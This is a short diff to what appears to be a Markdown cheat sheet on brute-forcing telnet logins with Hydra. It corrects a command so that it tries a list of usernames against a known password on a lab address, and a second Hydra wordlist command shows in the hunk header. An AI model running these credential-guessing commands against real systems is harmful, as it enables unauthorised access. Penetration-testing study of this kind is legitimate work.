@@ -79,7 +79,7 @@ hydra -t 1 -l user -P /opt/techyou.txt telnet://192.168.1.2 -V -F -I
 If you have a **`password`** and need the **`username`** this is the way.
 
 ```bash
-hydra -t 1 -l users.dic -p P@ssword1 telnet://192.168.1.2 -V -F -I
+hydra -t 1 -L users.dic -p P@ssword1 telnet://192.168.1.2 -V -F -I
 ```
 
 ---
